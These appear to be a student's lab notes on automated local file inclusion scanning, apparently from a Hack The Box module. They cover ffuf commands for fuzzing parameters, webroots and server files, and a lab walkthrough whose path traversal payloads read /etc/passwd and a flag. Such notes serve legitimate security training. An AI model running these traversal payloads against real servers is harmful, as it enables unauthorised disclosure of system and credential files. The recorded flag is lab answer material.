# Automated Scanning

## Fuzzing Parameters

Fuzz the page for common GET parameters :

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

--> important to fuzz for exposed parameters, as they tend not to be as secure as public ones.

Also can use a wordlist : https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters

## LFI wordlists

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

## Fuzzing Server Files

### Server Webroot

Linux :
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt

Windows :
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

### Server Logs/Configurations

Linux :
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

Windows :
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows


wget -c https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux -O LFI-WordList-Linux

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]

curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...

curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...

http://<SERVER_IP>:<PORT>/index.php?language=../../../../var/log/apache2/access.log

## LFI Tools

https://github.com/D35m0nd142/LFISuite
https://github.com/OsandaMalith/LFiFreak
https://github.com/mzfr/liffy

--> most of these tools are not maintained and rely on the outdated python2

## LAB

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.250.104:45346/index.php?FUZZ=value' -fs 2287

:: Progress: [2/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorstoken                   [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 0ms]
:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorsubmit                  [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 0ms]
:: Progress: [41/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorusername                [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 0ms]
...

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.250.104:45346/index.php?FUZZ=value' -fs 2309

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 0ms]

--> view

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://83.136.250.104:45346/index.php?view=../../../../FUZZ/index.php' -fs 2309

:: Progress: [4/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: /srv/www/sites/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/html/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/srv/www/               [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/srv/www/html/          [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/home/$USER/www/        [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/home/$USER/public_html/ [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 0ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/               [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 0ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/public/        [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/home/httpd/            [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/sites/         [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 0ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/home/www/              [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 2ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/public_html/   [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 1ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:/var/www/html/default/  [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 2ms]
:: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [13/13] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

--> too much results

wget -c https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux -O LFI-WordList-Linux

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://83.136.250.104:45346/index.php?view=../../../../FUZZ' -fs 2309

--> too much results

ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://83.136.250.104:45346/index.php?view=../../../../FUZZ' -fs 1935

--> no results

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.250.104:45346/index.php?view=FUZZ' -fs 2309

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.250.104:45346/index.php?view=FUZZ' -fs 1935

../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]
:: Progress: [290/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]
:: Progress: [291/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]
:: Progress: [292/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]
:: Progress: [293/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]
:: Progress: [294/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 0ms]


http://83.136.250.104:45346/index.php?view=../../../../../../../../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:105:107::/nonexistent:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin barry:x:1000:1000::/home/barry:/bin/sh

http://83.136.250.104:45346/index.php?view=../../../../../../../../../../../../../../../../../flag.txt

HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
